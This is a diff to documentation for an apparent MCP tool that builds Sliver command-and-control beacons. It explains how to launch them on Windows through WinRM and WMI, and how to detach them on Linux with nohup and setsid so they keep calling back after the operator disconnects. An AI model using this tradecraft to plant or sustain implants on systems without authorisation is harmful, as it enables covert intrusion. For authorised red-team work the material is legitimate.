@@ -29,3 +29,26 @@ Start-Process C:\Windows\Temp\beacon.exe
 `Win32_Process.Create` is the canonical Windows-over-WinRM delivery method for a
 Sliver beacon built by this MCP. Deliver the file first (`upload`, or stage it
 on a share), then create the process via WMI.
+
+## Linux — SSH / mosh delivery
+
+A bare `&` inside an SSH or mosh session does **not** fully detach the beacon: it
+stays in the session's process group and still receives `SIGHUP` when the session
+closes (the controlling terminal goes away), killing the beacon — the Linux
+equivalent of the WinRM job-object teardown above.
+
+Correct detachment needs a new session (`setsid`, which breaks SIGHUP
+propagation) plus `nohup` and stdin/stdout/stderr redirected away from the
+terminal:
+
+```bash
+# still in the session's process group, SIGHUP'd on disconnect:
+./beacon &
+
+# new session, no controlling terminal, survives session close:
+nohup setsid ./beacon </dev/null >/dev/null 2>&1 &
+```
+
+This is the Linux counterpart to the Windows `Win32_Process.Create()` pattern:
+both decouple the beacon from the delivery session so it keeps calling back after
+you disconnect.
